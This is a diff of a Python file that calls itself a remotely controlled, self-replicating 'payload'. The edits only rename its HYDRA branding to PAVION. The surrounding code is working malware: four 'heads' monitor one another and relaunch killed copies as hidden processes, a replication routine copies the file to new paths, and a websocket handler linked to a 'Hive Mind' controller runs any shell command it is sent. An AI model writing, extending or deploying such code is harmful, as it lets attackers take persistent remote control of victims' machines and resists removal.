@@ -1,5 +1,5 @@
 """
-PAVION PAYLOAD — v2.0 (HYDRA EDITION)
+PAVION PAYLOAD — v2.0 (CIEL EDITION)
 Distantly controlled, mutant, and extremely resilient payload.
 Mechanism: 4 heads that monitor and respawn each other unless all are killed simultaneously.
 """
@@ -76,7 +76,7 @@ class HydraGenome:
             
             return True
         except Exception as e:
-            print(f"[HYDRA] Replication failed to {target_path}: {e}")
+            print(f"[PAVION] Replication failed to {target_path}: {e}")
             return False
 
 # ==========================================
@@ -121,7 +121,7 @@ class ResilienceWatchdog:
                     s.close()
                 except (ConnectionRefusedError, socket.timeout, OSError):
                     # HEAD IS DEAD!
-                    print(f"[HYDRA] Head {i} is DOWN. Commencing resurrection...")
+                    print(f"[PAVION] Head {i} is DOWN. Commencing resurrection...")
                     self.resurrect(i)
 
     def resurrect(self, target_id):
@@ -132,9 +132,9 @@ class ResilienceWatchdog:
             try:
                 subprocess.Popen([sys.executable, target_path, "--head-id", str(target_id)], 
                                  creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0)
-                print(f"[HYDRA] Head {target_id} resurrected successfully at {target_path}")
+                print(f"[PAVION] Head {target_id} resurrected successfully at {target_path}")
             except Exception as e:
-                print(f"[HYDRA] Failed to launch resurrected head {target_id}: {e}")
+                print(f"[PAVION] Failed to launch resurrected head {target_id}: {e}")
 
 # ==========================================
 # CORE PAYLOAD LOGIC (ALPHA HEAD ONLY)
@@ -153,8 +153,8 @@ def on_message(ws, message):
             print(f"[PAVION] Connected to Hive Mind.")
         elif data.get("type") == "exec" and data.get("command"):
             cmd = data.get("command")
-            if cmd == "HYDRA_KILL_ALL": # Emergency Kill Switch
-                print("[HYDRA] RECEIVED EXTERMINATION ORDER. SHUTTING DOWN ALL HEADS.")
+            if cmd == "PAVION_KILL_ALL": # Emergency Kill Switch
+                print("[PAVION] RECEIVED EXTERMINATION ORDER. SHUTTING DOWN ALL HEADS.")
                 os._exit(0)
                 
             output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=45)
@@ -192,7 +192,7 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     head_id = args.head_id
-    print(f"--- HYDRA HEAD {head_id} ACTIVE ---")
+    print(f"--- PAVION HEAD {head_id} ACTIVE ---")
 
     # 1. Start the Watchdog
     watchdog = ResilienceWatchdog(head_id)
